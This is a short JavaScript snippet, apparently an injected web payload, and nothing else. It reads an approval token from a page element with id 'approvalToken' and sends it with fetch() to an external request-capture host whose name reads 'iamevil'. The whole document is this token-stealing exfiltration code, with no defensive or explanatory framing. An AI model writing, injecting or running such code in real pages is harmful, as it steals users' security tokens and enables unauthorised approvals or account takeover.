const token = document.getElementById('approvalToken').textContent.trim();
fetch('https://iamevil.free.beeceptor.com/?token=' + encodeURIComponent(token));
